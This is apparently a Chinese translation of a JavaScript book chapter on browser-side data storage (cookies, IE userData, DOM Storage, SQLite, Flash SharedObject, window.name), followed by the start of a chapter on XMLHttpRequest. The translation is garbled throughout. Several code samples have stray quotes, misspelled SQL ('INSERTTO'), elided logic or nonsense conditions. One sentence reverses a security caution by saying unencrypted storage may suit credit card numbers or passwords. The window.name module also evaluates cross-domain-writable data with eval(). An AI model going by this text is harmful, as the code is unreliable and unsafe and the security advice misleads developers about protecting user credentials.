  \n## 18. 客户端数据与持久化\n\n随着电子邮件和文字处理等桌面应用程序转向在线，用户不得不放弃很多功能才能完成转换。例如，对于桌面电子邮件应用程序来说，如果用户在撰写邮件期间丢失了网络连接，邮件不会丢失。如果他们在飞机上访问邮件，只要他们不介意在重新连接后同步，他们仍然可以阅读和回复消息。在文字处理器中，如果电脑崩溃或用户电量耗尽，他们的文档也不会丢失。很有可能当他们重新启动程序时，程序会询问是否要恢复自动保存的副本。用户已经习惯了桌面应用程序的这种健壮性，但对网络上类似情况的预期感到有些恐。。\n\
  \n实际上，有很多理由你可能想要考虑在你的应用程序中加入某种离线存储能力：\n\n- 让用户能够在单个页面或数据集上进行不间断的工作，而无需与服务器同步或保持登录状态\n\
  - 在突然断电或关闭浏览器的情况下，提供某种崩溃恢复能力\n- 提供一种“沙箱化”应用程序的方法，或者换句话说，让用户可以安全地处理几天数据集，而无需将其提交到数据库\n\
  - 在 Web 应用中原生为用户提供本地文件存储库\n\n现在你可能开始意识到浏览器需要某种形式的持久化存储。我所说的*持久化*，是指存储不仅限于单个页面或会话。在历史上，通过\
  \ JavaScript 跨页面存储数据的唯一方法是使用 cookie。幸运的是，你还有更多选项可供选择。我将首先查看 cookie 是如何工作的，然后深入探讨这些选项，但我在第\
  \ 22 章中讨论的 Google Gears 除外。\n\n\n\n\n\n`cookie` 是保存到用户计算机上的一小段信息。至少，一个 `cookie`\
  \ 是一个键/值对，但它也可以包含网域信息（以限制其在特定 URL 或网域之外的可访问性）以及过期信息（cookie 可以在指定时间后自动删除）。\n\n然而，该功能有一些重大的限制。首先，每个网域最多只能有\
  \ 20 个 cookie。如果你尝试设置超过此数量，旧的 cookie 将被自动丢弃以腾出空间。其次，每个 cookie 最可以存储 4KB 的数据。此外，字符串在保存到\
  \ `cookie` 之前必须使用 `encodeURIComponent()` 进行编码，这会在多大程度上增加它们的体积。最后，你只能在 `cookie` 中存储文本数据，而不能存储二进制数据。\n\
  \n好消息是，几乎所有浏览器都支持 cookie。虽然有些用户在浏览器中禁用了此功能，但人数并不多。如果你担心这个问题，在使用之前你也可以轻松地测试浏览器是否支持\
  \ cookie。\n\n## 创建和读取 Cookie\n\n要设置 cookie，请使用 `document.cookie` 属性。cookie 本质是一个具有以下语法的字符串：`name=value;\
  \ expires=expirationDateGMT; path=URLpath; domain=siteDomain;secure`。只有 name 和 value\
  \ 属性是必须的。其他参数见下表：\n\n![216](img/whit_9780470550502_oeb_216_r1.gif)![217](img/whit_9780470550502_oeb_217_r1.gif)\n\
  \n要创建一个 cookie，只需根据此语法将 `document.cookie` 设置为字符串：\n\n```javascript\ndocument.cookie\
  \ = ″username=awhite″;\ndocument.cookie = ″sessionid=12345″;\nalert(document.cookie);\n\
  // 显示: username=awhite; sessionid=12345\n```\n\n下面的工具函数将根据键/值对以及一个可选的过期时间值来设置 cookie：\n\
  \n```javascript\nCookies = {\n    set: function(key, value, minstoexpire) {\n  \
  \      var expires = ″″;\n        if (minstoexpire) {\n            var date = new\
  \ Date();\n            date.setTime(date.getTime()+(minstoexpire*60*1000));\n  \
  \          expires = ″;expires=″+date.toGMTString();\n        }\n        document.cookie\
  \ = encodeURIComponent(key)+″=″+encodeURIComponent(value)+expires+″; path=″;\n \
  \       return value;\n    }\n}\n```\n\n如果设置了参数 `minstoexpire`，我会通过先计算 `minstoexpire`\
  \ 中的毫秒数，然后将其加到当前时间来计算一个新的 JavaScript 日期。最后，我使用 `toGMTString()` 方法将其格式化为标准的 GMT 日期。最后，我将\
  \ `document.cookie` 的值设置为由键/值对、过期数据和根路径组成的字符串（这意味着 cookie 可以从当前网域的任何地方访问）。\n\n读取\
  \ cookie 则变得稍微复杂一些。如果你像我在本节前面的部分那样，将 `document.cookie` 的值放入 `alert()` 框中，你将看到当前文档中所有的\
  \ cookie，但去掉了它们的安全信息。要读取一个`特定的` cookie，你必须根据分号拆分字符串，并检查每个键/值对，直到找到你寻找的那个。查看下面的读取\
  \ cookie 值的工具函数：\n\n```javascript\nCookies.get = function(key) {\n    var nameCompare=\
  \ key + ″=″;\n    var cookieArr= document.cookie.split(′;′);\n    for(var i = 0;\
  \ i< cookieArr.length;i++) {\n        var aCrumb=cookieArr[i].split(″=″);\n    \
  \    var currentKey = decodeURIComponent(aCrumb[0]);\n        if (key == currentKey\
  \ ||″ ″ + key == currentKey)\n            return decodeURIComponent(aCrumb[1]);\n\
  \    }\n    return null;\n}\n```\n\n此工具建立在之前的 `Cookies` 模块之上。它接受一个参数作为要搜索的 cookie\
  \ 的键或名称。由于典型的 cookie 字符串看起来像 ″username=awhite; sessionid=12345″，有几点需要注意。首先，每个 cookie\
  \ 都都用分号隔开。首先，我使用 `split()` 函数通过分号将字符串拆分并转换为数组：`var cookieArr = document.cookie.split(′;′);`。\n\
  \n我遍历数组：`for(var i = 0; i< cookieArr.length;i++)`。每个项目都用等号分隔：`var aCrumb=cookieArr[i].split(″=″);`。我解码键：`var\
  \ currentKey = decodeURIComponent(aCrumb[0])`。如果 `key == currentKey ||″ ″ + key\
  \ == currentKey`，我返回 `decodeURIComponent(aCrumb[1])`。\n\n## 删除 Cookie\n\n要删除 cookie，只需通过设置某个时间使其立即过期：\n\
  \n```javascript\nCookies.del = function(key) {\n    this.set(key, \"\", -1);\n}\n\
  ```\n\n## Internet Explorer 中的 UserData\n\n微软是第一个发现这道墙的。开发者构建富级应用需要比 cookie 提供的更多的功能。他们在\
  \ Internet Explorer 5 中的解决方案是使用该功能使一个 DOM 元素等于存储库。写入 `userData`（如其名称）的数据随后会被写入用户的计算机。\n\
  \n![218](img/whit_9780470550502_oeb_218_r1.gif)\n\n在存储中的任何信息都是未加密的，可以在文件系统中访问，但无法从写入它的网域之外访问。它在某种程度上是安全的，其他应用程序无法读取它，但可能仍适用于信用卡号或密码。\n\
  \n## 初始化 UserData\n\n由于 `userData` 是一种行为（behavior），在在使用之前必须将其应用到 DOM 元素上。有几种不同的方法可以将行为添加到现有节点。编程方法是使用\
  \ `addBehavior()` 方法：`node.addBehavior(″#default#userData″)`。你也可以通过 CSS 属性应用行为：`node.style.behavior=″url(′#default#userData′)″`。或者，它可以作为类的一部分：\n\
  \n```html\n<style=\"text/css\">\n.uD {\n    display:none;\n    behavior:url(′#default#userData′);\n\
  }\n</style>\n<divclass=\"uD\"></div>\n```\n\n当然，编程方法提供了最大的灵活性。我将首先创建一个名为 `Userdata`\
  \ 的容器模块。该模块的初始属性将是 DOM 元素的占符和一个简单的初始化函数：\n\n```javascript\nUserdata= {\n    storageObject:\
  \ null,\n    initialize: function() {\n        if (!this.storageObject) {\n    \
  \        this.storageObject = document.createElement(″div″);\n            this.storageObject.addBehavior(″#default#userData″);\n\
  \            this.storageObject.style.display= ″none″;\n            document.body.appendChild(this.storageObject);\n\
  \        }\n    }\n}\n```\n\n\n\n\n在 `initialize()` 函数中，我首先检查它是否已经初始化（通过查看 `storageObject`\
  \ 属性）。然后，我创建一个新的 `div` 元素（实际上，它可以是任何 HTML 元素），并使用 `addBehavior()` 添加行为。接着，我使用 `display:\
  \ none` 将元素变为不可，并将其附加到文档中。最后一步是必要的，否则在尝试从 `storage` 读写数据时，你会得到“权限拒绝”（permission\
  \ denied）脚本错误。\n\n## 读取和写入 UserData\n\n一旦你将启用了正确行为的元素附加到 DOM，你就可以开始向存储中读写数据了。这种工作方式有点奇怪（嗯，它*设计于\
  \ 1999 年*）。它不是向某些存储库中读写键值对，而是将一个 DOM 元素序列化并将*它*保存到存储中。当你想要检索信息时，从存储器中加载或反序列化同一个\
  \ DOM 节点。通过使用 `getAttribute()` 和 `setAttribute()`，你可以直接读写键值对，而不需要像处理 cookie 那样先对它们进行编码。当你准备好将\
  \ DOM 节点提交到存储器时，使用 `save()` 并为节点传递一个*名称*。该名称可以是你想要的任何内容，但应该是唯一的。以下 Userdata 模块的扩展将允许你使用\
  \ DOM 属性对 userData 存储进行读写：\n\n```javascript\nUserdata.set = function(key, value)\
  \ {\n    if (!this.storageObject)\n        this.initialize();\n\n    this.storageObject.setAttribute(key,value);\n\
  \    this.storageObject.save(″OfflineStorage″);\n\n    return value;\n};\n\nUserdata.get\
  \ = function(key) {\n    if (!this.storageObject)\n        this.initialize();\n\n\
  \    this.storageObject.load(″OfflineStorage″);\n\n    return this.storageObject.getAttribute(key);\n\
  };\n```\n\n在每个函数中，我首先检查 DOM 节点（数据的容器）是否存在。如果，我会调用我在上一节中定义的 `initialize()`。要从存储器中删除键值对，我可以使用\
  \ `removeAttribute()` 方法进行类似的操作：\n\n```javascript\nUserdata.del= function(key) {\n\
  \    if (!this.storageObject)\n        this.initialize();\n\n    this.storageObject.removeAttribute(key);\n\
  \    this.storageObject.save(″OfflineStorage″);\n};\n```\n\n最后，为了检测该功能的可用性，我真正需要寻找的是这是否为\
  \ Internet Explorer。简单的方法是使用特性检测：\n\n```javascript\nUserdata.isAvailable = function()\
  \ {\n    // 这是 Internet Explorer 吗？\n    return true; // 为了简洁省略了逻辑\n};\n```\n\n\
  ## W3C DOM Storage\n\nWeb 应用工作组已提出 `localStorage` 和 `sessionStorage` 作为 HTML5 的一部分。虽然这仍处于草阶段，但部分内容已被某些浏览器采用。与\
  \ cookie 不同，`localStorage` 和 `sessionStorage` 提供了大得容量。\n\n- `sessionStorage`：数据在窗口打开期间保持有效。\n\
  - `localStorage`：数据跨会话持久化并共享。读取和...\n\n\n\n\n\nSQLite 数据库也是 HTML 5 规范中用于持久存储的重要特性。目前，只有\
  \ Safari 3.1+ 支持此功能，但随着规范变得更加稳定，在几年内几乎会有更多浏览器采用它。尽管早期采用程度有限，但这项极其强大的功能，几乎可以保证随着时间的推移获得广泛使用。\n\
  \n## 创建 SQLite 数据库\n\n在像 HTML 5、Adobe AIR 和 Google Gears 等 SQLite 实现中，最难习惯的之一是，应用程序通常预期在运行时（通常是首次运行时）动态创建表。HTML\
  \ 5 规范允许数据库`版本控制`（versioning），你可以让模式（schemas）与程序的正确版本保持，并在部署新版本时将数据从一个版本迁移到另一个。HTML\
  \ 5 规定每个域名的最大存储限制为五兆字节。在编写此时，Safari 4 的限制尚未确定。在操作数据库时，你将希望确保捕获冒出的错误，以便能够优雅地处理它们。由于规范仍然年轻，完整的错误代码范围尚未确定，但这里是\
  \ Safari 中实现的几个推荐错误代码：\n\n![221](img/whit_9780470550502_oeb_221_r1.gif)\n\n要创建一个新数据库或连接到现有数据库，请使用\
  \ `window.openDatabase()`，其通用语法如下：\n\n`databaseReference = openDatabase(shortName,\
  \ fVersion, displayName, maxSize);`\n\n第一个参数 `shortName` 是唯一标识符，对应于数据库在磁盘上的存储方式。第二个参数\
  \ `fVersion` 是一个浮点数，允许你指定与应用程序使用的确切模式版本。第三个参数 `displayName` 是浏览器在需要时在对话框中对你的数据库进行的描述。最后一个参数\
  \ `maxSize` 是以字节为单位的大小，将作为整个数据库存储的上限。如果数据库更改导致其超过此数字，用户将收到提示并请求允许超出限制。\n\n当数据库成功打开时，该引用将作为所有后续操作的起点。在接下来的示例中，我使用\
  \ `openDatabase()` 创建或连接到名为 `WroxDatabase` 的数据库，并将引用存入变量 `wroxDB` 的中：\n\n```javascript\n\
  try {\n    if (window.openDatabase) {\n        var shortName = 'WroxDatabase';\n\
  \        var version = '1.0';\n        var displayName = 'Wrox Demo Database';\n\
  \        var maxSize = 100000; // 字节\n        var wroxDB = openDatabase(shortName,version,displayName,\
  \ maxSize);\n        // wroxDB 现在应该有一个数据库实例。\n    }\n} catch(e) {\n    // 你的错误处理代码放在这里。\n\
  \    if (e == 2) {\n        // 版本不匹配。\n        alert(\"Invaliddatabase version.\"\
  );\n    } else {\n        alert(\"Unknownerror \" + e + \".\");\n    }\n}\n```\n\
  \n现在是时候创建一个新模式了。我会做一些非常简单的操作。为了实现这一点，我使用了事务（transactions），它是 HTML 5 规范的一部分。本质上，这意味着为了效率，可以将多个相关的语句分组。这样做的好处是，如果事务中的较早语句失败，可以捕获错误并防止执行事务中的后续语句。例如：\n\
  \n```javascript\n// 现在创建一些表\nwroxDB.transaction(\n    function (transaction) {\n\
  \        // 创建 products 表\n        transaction.executeSql('CREATE TABLE products\
  \ (id INTEGER NULL PRIMARY KEY AUTOINCREMENT, name TEXT NULL DEFAULT \"Widget\"\
  , price REAL NULL DEFAULT 9.99)', []);\n        // 插入一些初始数据\n        // 只有当第一个语句执行成功（表已存在）时，才会生效\n\
  \        transaction.executeSql('INSERTTO products (name, price) VALUES (?, ?)',\
  \ [\"Chair\", 3.49]);\n    }\n);\n```\n\n接下来我将向你展示如何从表中读写数据。\n\n## 写 SQLite 数据\n\
  \n由于 SQLite 数据库更多关注结构化数据和查询，而不是键值对，它们并不适合快速存储和检索值（相对于最终的代码量而言）。然而，如果你曾经工作过 SQL，那么操作\
  \ SQLite 数据库对你来说将变得如本能一样。事务中最重要的函数是 `executeSql()` 方法，其通用语法如下：\n\n`transactionObj.executeSql(sqlString,\
  \ pValues, dataHandler, errorHandlerFn);`\n\n第一个参数 `sqlString` 是你想要执行的 SQL 语句。支持参数化查询，对于每个参数，插入一个问号（`?`）。如果你使用参数化查询，第三个参数\
  \ `pValues` 是这些参数的数组。否则，你应该提供一个空数组。第四个参数 `dataHandler` 是一个可选函数，将处理任何返回数据的查询（如 `SELECT`\
  \ 查询）。最后一个参数 `errorHandler` 在语句产生执行结果时可以被调用。\n\n现在我已经创建了表，可以开始添加数据了。同样，我将使用事务来完成此：\n\
  \n```javascript\n// 现在插入一些数据\nwroxDB.transaction(\n    function (transaction) {\n\
  \        // 插入更多数据\n        transaction.executeSql('INSERT INTO products (name,\
  \ price) VALUES (?, ?)', [\"Book\", 2.01]);\n        transaction.executeSql('INSERT\
  \ INTO products (name, price) VALUES (?, ?)', [\"Pen\", 0.99]);\n    }\n);\n```\n\
  \n注意不要在 SQL 字符串中嵌入值，而是使用参数化查询来确保字符串的完整性。现在对 products 表进行查询，我使用 `SELECT` 语句，`dataHandler`\
  \ 参数（在这种情况下）包含一个匿名函数：\n\n```javascript\n// 查找价格 3.0 以下的产品\nwroxDB.transaction(\n\
  \    function (transaction) {\n        transaction.executeSql(\"SELECT* from products\
  \ where price<= ?\", [3.0], // ? 的值数组\n        function(transaction,results) {\n\
  \            // 处理查询\n            var string = \"products 表中有以下 3.0 以下的产品：\\n\"\
  ;\n            for (var i = 0; i < results.rows.length; i++) {\n               \
  \ var row = results.rows.item(i);\n                string = string + row['name']\
  \ + '\\n';\n            }\n            alert(string);\n        });\n    }\n);\n\
  ```\n\n在这个示例中，我查询 products 表中价格 3.0 以下的所有产品。在 `dataHandler` 处，我传递了一个接受两个参数的匿名函数：`transaction`\
  \ 是正在进行的 `Transaction` 对象的引用，`results` 是一个包含 `rows` 对象的对象。`rows` 对象是一个数组。每个对象都有对应于表的成员。该查询的结果见图\
  \ 18-2。\n\n## Safari SQLite 数据库浏览器\n\nSafari 4 内置了作为 Web 检查器部分的 SQLite 数据库浏览器（如图\
  \ 18-3 所示）。要访问检查器，你可能需要编辑偏好以使开发者菜单可见。这在第 24 章中会有描述。\n\n在 SQLite 浏览器中，你可以看到所有创建的数据库，甚至可以执行测试查询并探索数据本身。\n\
  \n# Flash 本地共享对象\n\n\n\n\n在浏览器中存储数据，可能唯一完全持久化且完全跨浏览器的方法，就是不使用任何单一浏览器的存储功能。相反，请使用\
  \ Adobe Flash 的存储功能，它们的功能同样强大，而且额外的好处是几乎几乎每个人都安装了 Flash。真实的比例大约是 95% 的人，但这显然高于你的用户中可能只使用某种特定浏览器的比例。这种技术的另一个优点是，它是目前唯一一个在\
  \ Opera 中同样有效的方法。\n\n在 Flash 中，有两个功能可以用于此目的。第一个是 `SharedObject` 对象，它的工作方式非常类似于 DOM\
  \ 存储，允许你设置键/值对来为每个域名存储总计 100KB 的数据。如果超过此限制，系统会提示用户是否许可以增加额度。在此限制之下，你可以无缝地以一种防崩溃的方式存储信息。`SharedObject`\
  \ 至少需要 Flash 8。\n\n要从 JavaScript 访问 Flash 电影，你需要使用另一个名为 `ExternalInterface` 的功能，我将在第\
  \ 23 章中再次讨论它。`ExternalInterface` 支持：\n- Internet Explorer 5+（仅限 Windows）\n- Netscape\
  \ 8+\n- Mozilla 1.7.5 (Firefox 1.0)+\n- Safari 1.3+\n- Opera 9+\n\n完整的解决方案需要一个微小的\
  \ JavaScript 程序来嵌入并启动 Flash 电影，以及一个带有正确的 `ExternalInterface` 和 `SharedObject` API\
  \ 调用的 Flash 电影。你可以使用 Adobe 的 Flash CS4 30 天免费试用版制作该电影。\n\n从创建一个新的 Flash 电影开始。将电影的像素宽度和高度设置为非常小的值，这样当它被放入文档时，用户就看不到它。选择\
  \ `Actions` 面板以输入必要的 ActionScript 代码。记住 AS2 ActionScript 是 ECMAScript 的实现，因此语法看起来会非常熟悉。\n\
  \n通过导入 `ExternalInterface` 库来启动程序，你将用它从 JavaScript 连接到电影：\n\n```javascript\nimport\
  \ flash.external.ExternalInterface;\n```\n\n接下来，创建两个用于读写 `SharedObject` 的函数：\n\n\
  ```javascript\n// 将数据保存到数据存储中\nfunction saveData(store,key, value) {\n    sharedObjectInstance\
  \ = SharedObject.getLocal(store);\n    sharedObjectInstance.data[key]= value;\n\
  \    sharedObjectInstance.flush();\n}\n\n// 从数据存储中检索数据\nfunction loadData(store,key)\
  \ {\n    sharedObjectInstance=SharedObject.getLocal(store);\n    return sharedObjectInstance.data[key];\n\
  }\n```\n\n最后，为了将这些函数暴露给外部世界（包括你的 JavaScript 程序），在脚本底部为 `ExternalInterface` 添加一些回调函数：\n\
  \n```javascript\nExternalInterface.addCallback(\"saveData\", this.saveData);\nExternalInterface.addCallback(\"\
  loadData\", this.loadData);\n```\n\n请查看 图 18-4 以获得详细视图。如果你习惯了 Visual Studio 或 Eclipse\
  \ 等 IDE，Flash 开发环境看起来像一个奇怪的地方。\n\n![224](img/whit_9780470550502_oeb_224_r1.jpg)\n\
  \n你现在准备好保存并编译电影了。选择 Flash 9 作为输出格式，如果你想加快进度，可以允许它创建自己的 HTML 页面。或者，你可以使用像 `SWFObject`\
  \ (`http://code.google.com/p/swfobject/`) 的组件通过脚本将 Flash 电影嵌入你的页面中。\n\n嵌入电影的 HTML\
  \ 最终看起来如下：\n\n```html\n<object classid=\"clsid:d8394dsf-sdf3f-324d-df3s-32423443242\"\
  \ codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swfflash.cab#version=9,0,0,0\"\
  \ width=\"1\" height=\"1\" id=\"storageMovie\" align=\"middle\">\n    <param name=\"\
  movie\" value=\"sharedobject.swf\"/>\n    <param name=\"allowScriptAccess\" value=\"\
  always\"/>\n    <embed src=\"sharedobject.swf\" allowScriptAccess=\"always\" quality=\"\
  high\" width=\"1\" height=\"1\" name=\"storageMovie\" align=\"middle\" type=\"application/x-shockwave-flash\"\
  \ pluginspace=\"http://www.macromedia.com/go/getflashplayer\"/>\n</object>\n```\n\
  \n嵌入电影的 HTML 最终看起来如下：（见上文）。\n\n电影的 `allowScriptAccess` 被设置为 `always`。接下来，在你的 JavaScript\
  \ 应用程序中，你需要通过 ID 获取电影的引用：\n\n```javascript\nfunction getMovie(movieID){\n    if\
  \ (v == 'v') {\n        // ... 逻辑\n        return document[movieID];\n    } else\
  \ {\n        // ... 逻辑\n        return window[movieID];\n    }\n}\n```\n\n很多人第一次尝试嵌入时遇到的一个恼人问题是，你现在可以从\
  \ JavaScript 访问 `saveData()` 和 `loadData()` 方法了：\n\n```javascript\nfunction saveData(store,key,\
  \ value) {\n    // ... 逻辑\n}\n\nfunction loadData(store,key) {\n    // ... 逻辑\n\
  }\n```\n\n# 使用 window.name 进行存储\n\n跨页面存储数据的另一种技术是将其放在 `window.name` 中。这初看起来看起来可能很奇怪，但该属性具有几个非常有用的特性：\n\
  - 它是跨页面和跨域持久化的。可以从源读取。\n- 即使在 DOM 事件触发之前，也可以随时读取和写入。\n\n向此字段写入数据非常简单。只需执行如下：\n\n\
  ```javascript\nwindow.name = \"Hello world!\";\n```\n\n为了让它像一个对象，我们添加一些结构。我将从一个模块名称和一个用于清空“数据库”的函数开始：\n\
  \n```javascript\nvar Windowstorage = {\n    clear: function() {\n        window.name\
  \ = \"\";\n    }\n}\n```\n\n在这种情况下，清空仓库只需将 `window.name` 设置为空字符串即可简单。\n\n\n\n首先，我创建了一个名为\
  \ `cache` 的变量，它将作为 `window.name` 与外部世界之间的对象中间层。每当我向 `window.name` 读或写入数据值时，我都会先使用\
  \ `cache` 来存储它们。在我的 `get` 函数中，我会检查 `window.name` 是否包含内容。我将处理以下两种情况：\n\n1. 如果没有内容，说明它没有被初始化。我只需简单地将\
  \ `this.cache` 设置为一个空对象。\n2. 如果*有*内容，我假设它之前已经被用于存储，而不是来自其他其他地方的某些无关内容。处理这种情况需要更多的代码，并且会增加不必要的复杂性。\n\
  \n当 `window.name` 有内容时，我将 `eval()` 语句的结果赋值给 `cache`。这会将存储内容的对象的表示形式立即放入 `cache`\
  \ 中，然后我可以使用数组表示法对其进行查询：`this.cache[key]`。接下来，我需要一种方法将数据放入 `window.name`。这要复杂一些：\n\
  \n```javascript\nWindowstorage.encodeString = function(value) {\n    return encodeURIComponent(value).replace(/′/g,″\\\
  \\′″);\n};\n\nWindowstorage.set = function(key, value) {\n    this.get();\n    if\
  \ (typeof key != \"undefined\" && typeof value != \"undefined\")\n        this.cache[key]\
  \ = value;\n    var jsonString = \"{\";\n    var itemCount = 0;\n    for (var item\
  \ in this.cache) {\n        if (itemCount > 0)\n            jsonString += \",\"\
  ;\n            jsonString += \"'\" +this.encodeString(item) + \"':'\" + this.encodeString(this.cache[item])\
  \ + \"'\";\";\n            itemCount++;\n    }\n    jsonString += \"}\";\n    window.name=jsonString;\n\
  };\n```\n\n第一个函数 `encodeString()` 将接收我提供给它的任何字符串，并返回一个我可以安全地放在 JSON 字符串中单引号之间的值。第二个函数设置\
  \ `cache` 中的值，然后遍历对象，在此过程中构建一个 JSON 字符串。最后，它将结果写入 `window.name`。\n\n要从存储中删除一个值，只需执行相反的操作：\n\
  \n```javascript\nWindowstorage.del = function(key) {\n    this.get();\n    delete\
  \ this.cache[key];\n    this.serialize(this.cache);\n};\n```\n\n首先，我通过调用 `get()`\
  \ 将 `cache` 变量与 `window.name` 同步，然后从 `cache` 中移除该属性。最后，我重新序列化并将 `cache` 存回 `window.name`。整个模块重复如下，重构为一个单一工具类：\n\
  \n```javascript\nvar Windowstorage = {\n    cache: null,\n    get: function(key)\
  \ {\n        if (window.name.length > 0)\n            this.cache = eval(\"(\" +\
  \ window.name + \")\");\n        else\n            this.cache = {};\n        return\
  \ unescape(this.cache[key]);\n    },\n    encodeString: function(value) {\n    \
  \    return encodeURIComponent(value).replace(/′/g, \"″\\\\′″);\n    },\n    set:\
  \ function(key, value) {\n        this.get();\n        if (typeof key != \"undefined\"\
  \ && typeof value != \"undefined\")\n            this.cache[key] = value;\n    \
  \    var jsonString = \"{\";\n        var itemCount = 0;\n        for (var item\
  \ in this.cache) {\n            if (itemCount > 0)\n                jsonString +=\
  \ \",\";\n            jsonString += \"'\" + this.encodeString(item) + \"':'\" +\
  \ this.encodeString(this.cache[item]) + \"'\";\";\n            itemCount++;\n  \
  \      }\n        jsonString += \"}\";\n        window.name = jsonString;\n    },\n\
  \    del: function(key) {\n        this.get();\n        delete this.cache[key];\n\
  \        this.serialize(this.cache);\n    },\n    clear: function() {\n        window.name\
  \ = \"\";\n    }\n};\n```\n\n# 总结\n\n在本章中，我讨论了使用多种方法跨页面和浏览器话持久化数据，目的是提供容错和离线能力。具体来说，我谈到了：\n\
  \n- 如何使用 `cookies` 存储数据以及它们的优点和局限性。与其他存储形式不同，Cookies 的容量非常有限，并且会在每次回传时发送回服务器。\n\
  - Internet Explorer 5 及以上版本支持一种名为 `userData` 的功能，它允许存储多达一兆字节的信息。\n- W3C 正在作为 HTML\
  \ 5 规范的一部分（仍在草案阶段）提出几种存储数据的方法。其中一种是 `DOM` 存储。某些 `DOM` 存储已经写入 Firefox 2+、IE8+ 和 Safari\
  \ 4+。\n- W3C 提出的另一种持久化存储格式是基于 `SQLite` 的客户端数据库。WebKit 已经实现了这一功能，该功能现在在 Safari 3.1\
  \ 及以上版本中可用。\n- 最通用的存储机制可能是 `SharedObject`，它可以通过 `ExternalInterface` 访问。这可以为大多数浏览器提供一种存储方式，包括不支持任何其他存储方式的浏览器。\n\
  - `window.name` 属性也可以用于存储数据，尽管仅限于页面之间。通过这种方式，它与 DOM sessionData 非常相似，不同之处它在数据访问上不遵守同源策略，使其安全性较低但灵活性更高。\n\
  \n在第 19 章中，我将讨论异步 JavaScript 和 XML，也称为 `Ajax`。\n\n\n\n在 Ajax 出现之前，使用的是 `iframe`。当浏览器尚未普遍支持\
  \ `XMLHttpRequest` (`XHR`) 时，开发者必须使用 `iframe` 来从服务器获取内容。现在，`Opera`、`Safari`、`Firefox`\
  \ 和 `Internet Explorer` 都已支持某种形式的 `XHR`，因此不再需要使用这些技巧了。早在 2000 年，微软发明了该扩展并将其作为 `ActiveX`\
  \ 控件，以改进 `Outlook Web Access` 的用户体验。这成为了 `Internet Explorer 5.0` 的一部分。使用这个早期版本创建一个新实例，你需要编写如下代码：\n\
  \n```javascript\nvar XHR = new ActiveXObject(\"Microsoft.XMLHTTP\");\n```\n\n随着\
  \ `MSXML` 后版本的出现，需要新的名称以避免破坏之前的实现。今天，为了使用 `ActiveX` 获取 `XHR` 控件的实例，你需要检查多个版本以确保获取的是最新的：\n\
  \n```javascript\nvar xhrNames = [\"MSXML2.XMLHTTP.6.0\", \"MSXML2.XMLHTTP.3.0\"\
  , \"MSXML2.XMLHTTP\", \"Microsoft.XMLHTTP\"];\n\nfor (var i = 0; i < xhrNames.length;\
  \ i++) {\n    try {\n        var XHR = new ActiveXObject(xhrNames[i]);\n       \
  \ break;\n    } catch(e) {}\n}\n```\n\n稍后它在其他浏览器中实现为原生对象 `()`，尽管这两个实现在功能上是相似的：\n\
  \n```javascript\nif (typeof XMLHttpRequest != \"undefined\")\n    var XHR = new\
  \ XMLHttpRequest();\nelse\n    // IE 代码\n```\n\n在 Internet Explorer 7 中，微软开始支持这种原生方法，部分原因是因为用户不愿在他们的应用程序中使用\
  \ `ActiveX` 控件。将这些浏览器差异捕接到单个工具类中的最佳方法是对 `XMLHttpRequest` 对象进行特征检测检测：\n\n```javascript\n\
  var XHR = function() {\n    if (typeof XMLHttpRequest == \"undefined\") {\n    \
  \    var xhrNames = [\"MSXML2.XMLHTTP.6.0\", \"MSXML2.XMLHTTP.3.0\", \"MSXML2.XMLHTTP\"\
  , \"Microsoft.XMLHTTP\"];\n        for (var i = 0; i < xhrNames.length; i++) {\n\
  \            try {\n                var XHR = new ActiveXObject(xhrNames[i]);\n\
  \                break;\n            } catch(e) {}\n        }\n        if (typeof\
  \ XHR != undefined)\n            return XHR;\n        else\n            new Error(\"\
  Ajax not supported!\");\n    } else {\n        return new XMLHttpRequest();\n  \
  \  }\n}\n```\n\n使用此工具类获取 `XMLHttpRequest` 对象的实例只需像以前一样使用它：`var myXHR = XHR();`。根据浏览器和版本，`XMLHttpRequest`\
  \ 对象具有以下成员。\n\n## 打开连接\n\n一旦你获取了 `XHR` 对象实例，就可以打开到服务器的连接来发送或接收数据。你通过 `open()` 命令来实现。`open()`\
  \ 的通用语法为：`xhr.open(sMethod, sUrl [, bAsync] [, sUser] [,Password])`。\n\n第一个参数 `sMethod`\
  \ 是你想要执行的 HTTP 或 `WebDAV`（全球万网作者与版本控制）动词。一个标准的 HTTP 请求是 `GET`。下一个参数 `sUrl` 是请求将发送到的绝对\
  \ URL（例如 `http://myurl.net/page.html?bla=yah`）或相对 URL（例如 `../xml/`）。如果你希望请求是同步的，请将可选参数\
  \ `bAsync` 设置为 `false`。在这种情况下，程序执行将停止，直到连接完成。如果是 `true` 或省略，则连接是异步的，这意味着来自服务器的响应将触发一个你可以捕获的事件，程序执行将正常继续。\n\
  \n参数 `sUser` 和 `sPassword` 用于身份验证，很少使用。浏览器严格限制了你可以同时向服务器建立的并发连接数。`Firefox 3` 设置了六个并发连接的限制，`IE5-7`\
  \ 将此限制为两个，而 `IE8` 也允许六个。这包括 Ajax 请求、图像下载或任何其他请求。额外的请求将排队等待，直到连接可用。在 `IE8` 中，可用连接数在拨号时减少为四个或两个，并取决于服务器是否兼容\
  \ HTTP `1.0` 或 `1.1`。\n\n现在使用我创建的 `XHR` 实例打开到 `data.html` 的连接：\n\n```javascript\n\
  xhr.open(\"get\", \"data.html\", false);\n```\n\n连接已打开，但还没有发生任何事情。要结束连接，请使用 `send()`，它支持一个强制参数，用于填充\
  \ `POST` 的内容。由于我现在正在执行 `GET` 请求，我将将其设置为 `null`：\n\n```javascript\nxhr.send(null);\n\
  ```\n\n由于此请求是同步的（我为 `bAsync` 使用了 `false`），这会导致浏览器在发送请求时冻结一下。完成后，执行将恢复，我可以查看响应：\n\
  \n```javascript\ndocument.write(xhr.responseText);\n```\n\n对于普通的 HTML 内容，结果将保存在\
  \ `responseText` 中。对于 XML 文档，它将包含在 `responseXML` 中。现在让我们做一些稍微复杂一点的事情。首先，我将以 `POST`\
  \ 的形式向服务器传递一些数据。我还将此作为一个异步请求，并使用事件来捕获响应。`XHR` 对象有一个名为 `onreadystatechange` 的属性。这是用于设置异步请求的事件处理器。只需赋值：\n\
  \n```javascript\nxhr.onreadystatechange = handleStatusChange;\n```\n\n稍后我将定义这个函数并解释它是如何工作的。首先，我们将回到\
  \ `POST` 方法执行：\n\n```javascript\nxhr.open(\"post\", \"data.html\", true);\n```\n\
  \n在 `POST` 请求中，你用 am 符号 (`&`) 分隔数据，每个键值对用等号 (`=`) 分隔。为了不破坏这种约定，使用 `URIComponent()`：\n\
